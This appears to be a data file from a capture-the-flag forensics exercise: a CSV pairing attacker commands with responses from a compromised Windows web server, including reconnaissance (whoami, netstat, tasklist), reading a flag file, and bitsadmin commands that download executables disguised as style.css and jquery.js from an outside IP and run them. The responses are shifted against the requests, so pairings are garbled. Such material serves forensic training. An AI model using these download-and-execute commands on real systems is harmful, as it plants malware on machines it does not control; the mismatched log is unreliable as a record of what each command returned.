@@ -1,0 +1,169 @@
+"requests","responses"
+"whoami",""
+"whoami",""
+"whoami",""
+"dir","as120494334\\administrator"
+"echo %COMSPEC%","as120494334\\administrator"
+"netstat -ano","as120494334\\administrator"
+"tasklist"," Volume in drive C is System Drive
+ Volume Serial Number is 3608-2E5B
+
+ Directory of C:\\wsite
+
+01/08/2023  03:34 AM    <DIR>          .
+01/07/2023  03:06 AM                27 flag2.txt
+01/08/2023  03:31 AM    <DIR>          img
+01/08/2023  03:50 AM             3,349 index.js
+01/08/2023  03:31 AM    <DIR>          log
+01/08/2023  03:35 AM    <DIR>          node_modules
+01/08/2023  03:35 AM           282,957 package-lock.json
+01/07/2023  02:19 AM               768 package.json
+01/08/2023  03:31 AM    <DIR>          public
+01/08/2023  03:31 AM    <DIR>          views
+               4 File(s)        287,101 bytes
+               6 Dir(s)  54,363,615,232 bytes free
+"
+"type flag2.txt","C:\\Windows\\system32\\cmd.exe
+"
+"bitsadmin /transfer getFiles /download /priority normal http://158.247.195.222:80/css/style.css C:\\Windows\\NTwindows.exe","
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3116
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       796
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       604
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       476
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       340
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       996
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       596
+  TCP    0.0.0.0:49708          0.0.0.0:0              LISTENING       4484
+  TCP    139.180.175.102:80     158.247.195.222:33674  ESTABLISHED     3116
+  TCP    139.180.175.102:139    0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       3116
+  TCP    [::]:135               [::]:0                 LISTENING       796
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       1012
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       604
+  TCP    [::]:49665             [::]:0                 LISTENING       476
+  TCP    [::]:49666             [::]:0                 LISTENING       340
+  TCP    [::]:49667             [::]:0                 LISTENING       996
+  TCP    [::]:49668             [::]:0                 LISTENING       596
+  TCP    [::]:49708             [::]:0                 LISTENING       4484
+  UDP    0.0.0.0:123            *:*                                    1956
+  UDP    0.0.0.0:500            *:*                                    996
+  UDP    0.0.0.0:3389           *:*                                    1012
+  UDP    0.0.0.0:4500           *:*                                    996
+  UDP    0.0.0.0:5353           *:*                                    1304
+  UDP    0.0.0.0:5355           *:*                                    1304
+  UDP    127.0.0.1:55702        127.0.0.1:55702                        996
+  UDP    139.180.175.102:137    *:*                                    4
+  UDP    139.180.175.102:138    *:*                                    4
+  UDP    [::]:123               *:*                                    1956
+  UDP    [::]:500               *:*                                    996
+  UDP    [::]:3389              *:*                                    1012
+  UDP    [::]:4500              *:*                                    996
+  UDP    [::]:5353              *:*                                    1304
+  UDP    [::]:5355              *:*                                    1304"
+"cmd /c C:\\Windows\\NTwindows.exe &","
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        140 K
+Registry                        76 Services                   0     47,196 K
+smss.exe                       296 Services                   0      1,240 K
+csrss.exe                      408 Services                   0      6,056 K
+wininit.exe                    476 Services                   0      7,104 K
+csrss.exe                      484 Console                    1      5,860 K
+winlogon.exe                   536 Console                    1     10,792 K
+services.exe                   596 Services                   0      8,252 K
+lsass.exe                      604 Services                   0     17,692 K
+svchost.exe                    704 Services                   0     24,920 K
+fontdrvhost.exe                712 Services                   0      3,568 K
+fontdrvhost.exe                720 Console                    1      3,468 K
+svchost.exe                    796 Services                   0     13,600 K
+dwm.exe                        888 Console                    1     18,552 K
+LogonUI.exe                    896 Console                    1     45,028 K
+svchost.exe                    996 Services                   0     48,344 K
+svchost.exe                   1004 Services                   0     12,788 K
+svchost.exe                   1012 Services                   0     26,392 K
+svchost.exe                    340 Services                   0     29,456 K
+svchost.exe                    364 Services                   0     29,532 K
+svchost.exe                   1064 Services                   0     21,216 K
+svchost.exe                   1304 Services                   0     25,096 K
+svchost.exe                   1424 Services                   0      9,148 K
+svchost.exe                   1564 Services                   0      6,960 K
+svchost.exe                   1592 Services                   0     10,740 K
+svchost.exe                   1640 Services                   0     17,012 K
+svchost.exe                   1868 Services                   0     37,684 K
+svchost.exe                   1928 Services                   0      8,752 K
+svchost.exe                   1956 Services                   0      7,776 K
+MsMpEng.exe                   2020 Services                   0    160,676 K
+AggregatorHost.exe            2252 Services                   0      4,620 K
+msdtc.exe                     2376 Services                   0     10,828 K
+svchost.exe                   2448 Services                   0      7,988 K
+csrss.exe                     1196                            2      6,916 K
+winlogon.exe                  2404                            2     11,252 K
+fontdrvhost.exe               2484                            2      5,724 K
+dwm.exe                       2680                            2     40,068 K
+rdpclip.exe                   1840                            2     11,908 K
+sihost.exe                    1772                            2     29,304 K
+svchost.exe                    984                            2     33,200 K
+taskhostw.exe                 2300                            2     13,332 K
+svchost.exe                   3156 Services                   0     16,180 K
+ctfmon.exe                    3304                            2     20,568 K
+explorer.exe                  3468                            2    150,688 K
+TextInputHost.exe             3824                            2     43,912 K
+StartMenuExperienceHost.e     3844                            2     44,936 K
+RuntimeBroker.exe             3972                            2     22,028 K
+SearchApp.exe                 4068                            2     69,648 K
+RuntimeBroker.exe             1348                            2     58,912 K
+svchost.exe                   4260                            2     16,216 K
+dllhost.exe                   4392                            2     14,240 K
+RuntimeBroker.exe             4612                            2     12,984 K
+svchost.exe                   4484 Services                   0      7,448 K
+ApplicationFrameHost.exe      4212                            2     24,672 K
+SecurityHealthService.exe     3940 Services                   0     19,232 K
+powershell_ise.exe            3588                            2    168,840 K
+conhost.exe                   3380                            2     17,760 K
+sysmon64.exe                  2960 Services                   0     19,532 K
+unsecapp.exe                  2136 Services                   0      7,036 K
+powershell.exe                4236                            2     76,488 K
+conhost.exe                   3556                            2     22,708 K
+powershell.exe                3772                            2     72,904 K
+conhost.exe                   3880                            2     22,300 K
+cmd.exe                        204                            2      4,552 K
+node.exe                      4948                            2     43,016 K
+cmd.exe                       4876                            2      4,572 K
+node.exe                      3212                            2     35,632 K
+tshark.exe                    2276                            2    110,884 K
+dumpcap.exe                   3668                            2      9,756 K
+conhost.exe                   3200                            2     14,848 K
+LogonUI.exe                   3996                            2     30,248 K
+node.exe                      3116                            2     46,520 K
+cmd.exe                       3724                            2      4,080 K
+tasklist.exe                  3804                            2      8,808 K
+WmiPrvSE.exe                  2120 Services                   0      9,180 K
+"
+"bitsadmin /transfer getFiles /download /priority normal http://158.247.195.222:80/js/jquery.js C:\\Users\\Public\\staging\\service.exe","CCH2{1f_0nly_1_w4zn7_d3v'n"
+"C:\\Users\\Public\\staging\\service.exe",""
+"","
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Transfer complete."
+"",""
+"",""
+"","
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright Microsoft Corp.
+
+Transfer complete."
+"",""
